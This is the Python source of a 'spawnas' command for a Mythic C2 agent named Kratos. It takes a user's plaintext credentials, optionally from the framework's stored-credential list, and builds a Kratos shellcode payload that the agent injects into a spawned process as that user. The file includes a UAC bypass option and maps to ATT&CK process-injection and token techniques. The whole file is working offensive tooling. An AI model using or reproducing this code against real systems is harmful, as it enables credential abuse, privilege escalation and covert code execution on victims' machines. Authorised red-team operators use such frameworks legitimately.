import asyncio

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class SpawnAsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                cli_name="Payload",
                display_name="Payload Kratos shellcode",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_shellcode_payloads,
                description="Kratos shellcode payload to inject into the spawnto process",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=0),
                    ParameterGroupInfo(group_name="credential_store", required=True, ui_position=0),
                ],
            ),
            CommandParameter(
                name="credential",
                cli_name="Credential",
                display_name="Credential",
                type=ParameterType.Credential_JSON,
                limit_credentials_by_type=["plaintext"],
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=True, ui_position=1),
                ],
            ),
            CommandParameter(
                name="username",
                cli_name="Username",
                display_name="Username",
                type=ParameterType.String,
                description="Account username to spawn as. Format: DOMAIN\\user, user@domain, or user (local).",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="password",
                cli_name="Password",
                display_name="Password",
                type=ParameterType.String,
                description="Account password.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain",
                type=ParameterType.String,
                default_value="",
                description="Domain name for domain accounts, '.' for local accounts, or leave empty to auto-resolve.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="logon_type",
                cli_name="LogonType",
                display_name="Logon Type",
                type=ParameterType.ChooseOne,
                choices=["2 - Interactive", "3 - Network", "4 - Batch", "5 - Service", "8 - NetworkCleartext", "9 - NewCredentials"],
                default_value="2 - Interactive",
                description=(
                    "2=Interactive (CreateProcessWithLogonW, full token), "
                    "3=Network (LogonUser+SetThreadToken, SeImpersonatePrivilege required), "
                    "4=Batch (LogonUser+SetThreadToken, SeBatchLogonRight on target), "
                    "5=Service (LogonUser+SetThreadToken, SeServiceLogonRight on target), "
                    "8=NetworkCleartext (LogonUser+SetThreadToken, creds stay in memory), "
                    "9=NewCredentials (CreateProcessWithLogonW, inherits current token)"
                ),
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=4),
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=2),
                ],
            ),
            CommandParameter(
                name="push_mode",
                cli_name="PushMode",
                display_name="Push Mode",
                type=ParameterType.Boolean,
                default_value=False,
                description="Send shellcode in a single chunk. Faster but larger get_tasking response.",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=5),
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=3),
                ],
            ),
            CommandParameter(
                name="chunk_size_mb",
                cli_name="ChunkSizeMB",
                display_name="Chunk Size (MB)",
                type=ParameterType.Number,
                default_value=4,
                description="Shellcode download chunk size in MB (pull mode only).",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=6),
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=4),
                ],
            ),
            CommandParameter(
                name="bypass_uac",
                cli_name="b",
                display_name="Bypass UAC (-b)",
                type=ParameterType.Boolean,
                default_value=False,
                description=(
                    "UAC bypass: LogonUser (non-filtered type) + copy IL + strip DACL + "
                    "ImpersonateLoggedOnUser + CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY). "
                    "Only effective for logon types 2/9. "
                    "Fails with err 1326 on hardened Windows 10/11 without permissive LSA policy."
                ),
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=7),
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=5),
                ],
            ),
        ]

    async def get_shellcode_payloads(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        result = PTRPCDynamicQueryFunctionMessageResponse(Success=True)
        search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=inputMsg.Callback,
            PayloadTypes=["kratos"],
        ))
        choices = []
        if search.Success and search.Payloads:
            for p in search.Payloads:
                build_params = {bp.Name: bp.Value for bp in p.BuildParameters}
                if build_params.get("output_format") == "shellcode":
                    choices.append(f"{p.Filename} - {p.Description}")
        if not choices:
            result.Choices = ["[No Kratos shellcode payload found - build one with output_format=shellcode]"]
            return result
        result.Choices = choices
        return result

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Expected JSON arguments but got command line arguments.")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class SpawnAsCommand(CommandBase):
    cmd = "spawnas"
    needs_admin = False
    help_cmd = "spawnas (modal popup)"
    description = (
        "Spawn a new Kratos session inside the spawnto process under another user's credentials. "
        "Uses CreateProcessWithLogonW with LOGON_WITH_PROFILE (full user token). "
        "Leave domain empty to let Windows auto-resolve (domain accounts). Use '.' for local accounts."
    )
    version = 1
    author = "@goultarde"
    attackmapping = ["T1055", "T1055.004", "T1134.002"]
    argument_class = SpawnAsArguments
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        if taskData.args.get_parameter_group_name() == "credential_store":
            cred     = taskData.args.get_arg("credential")
            username = cred.get("account", "") if isinstance(cred, dict) else ""
            domain   = cred.get("realm",   "") if isinstance(cred, dict) else ""
            password = cred.get("credential", "") if isinstance(cred, dict) else ""
            taskData.args.remove_arg("credential")
            taskData.args.add_arg("username", username, type=ParameterType.String)
            taskData.args.add_arg("password", password, type=ParameterType.String)
            taskData.args.add_arg("domain",   domain,   type=ParameterType.String)
        else:
            username = taskData.args.get_arg("username") or ""
            domain   = taskData.args.get_arg("domain") or ""

        if not username:
            raise Exception("username is required")

        # Resolve logon_type to integer
        logon_choice = taskData.args.get_arg("logon_type") or "2 - Interactive"
        logon_type_int = int(logon_choice.split(" ")[0])
        taskData.args.remove_arg("logon_type")
        taskData.args.add_arg("logon_type", logon_type_int, type=ParameterType.Number)
        logon_labels = {2: "Interactive", 3: "Network", 4: "Batch", 5: "Service", 8: "NetworkCleartext", 9: "NewCredentials"}
        logon_label = logon_labels.get(logon_type_int, str(logon_type_int))

        raw = taskData.args.get_arg("template")
        if raw.startswith("[") and "]" in raw:
            raw = raw[raw.index("]") + 1:].strip()
        filename, _, description = raw.partition(" - ")
        filename    = filename.strip()
        description = description.strip()

        template_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=taskData.Callback.ID,
            PayloadTypes=["kratos"],
            Filename=filename,
            Description=description,
        ))
        if not template_search.Success or not template_search.Payloads:
            raise Exception(f"Template payload not found: {filename!r} / {description!r}")

        template = template_search.Payloads[0]
        build_params = {bp.Name: bp.Value for bp in template.BuildParameters}
        if build_params.get("output_format") != "shellcode":
            raise Exception(
                f"Selected payload has output_format='{build_params.get('output_format')}' - choose a shellcode build."
            )

        new_payload = await SendMythicRPCPayloadCreateFromUUID(MythicRPCPayloadCreateFromUUIDMessage(
            TaskID=taskData.Task.ID,
            PayloadUUID=template.UUID,
            NewDescription="{}'s spawnas session from task {}".format(
                taskData.Task.OperatorUsername, str(taskData.Task.DisplayID)
            ),
        ))
        if not new_payload.Success:
            raise Exception("Failed to start payload build process")

        file_id = None
        while True:
            resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                PayloadUUID=new_payload.NewPayloadUUID,
            ))
            if not resp.Success:
                raise Exception(resp.Error)
            phase = resp.Payloads[0].BuildPhase
            if phase == "success":
                file_id = resp.Payloads[0].AgentFileId
                bypass_uac = taskData.args.get_arg("bypass_uac") or False
                display = f"spawning as {domain}\\{username} [{logon_label}] from '{template.Description}'"
                if bypass_uac:
                    display += " [bypass_uac]"
                response.DisplayParams = display
                break
            elif phase == "error":
                raise Exception("Payload build failed")
            elif phase == "building":
                await asyncio.sleep(2)
            else:
                raise Exception(f"Unexpected build phase: {phase}")

        file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            AgentFileID=file_id,
        ))
        if file_search.Success and file_search.Files:
            stored_md5 = file_search.Files[0].Md5
            taskData.args.add_arg("shellcode_md5", stored_md5, ParameterType.String)
            response.DisplayParams += f" | md5={stored_md5}"
        else:
            taskData.args.add_arg("shellcode_md5", "", ParameterType.String)

        push_mode = taskData.args.get_arg("push_mode") or False
        taskData.args.add_arg("file", file_id, ParameterType.String)
        if push_mode:
            file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
                AgentFileId=file_id,
            ))
            if not file_content.Success:
                raise Exception(f"Failed to retrieve shellcode content: {file_content.Error}")
            taskData.args.add_arg("sc_chunk_size", len(file_content.Content), ParameterType.Number)
            response.DisplayParams += " | push"
        else:
            chunk_size_mb = int(taskData.args.get_arg("chunk_size_mb") or 4)
            taskData.args.add_arg("sc_chunk_size", chunk_size_mb * 1024 * 1024, ParameterType.Number)
            response.DisplayParams += " | pull"
        taskData.args.remove_arg("template")
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
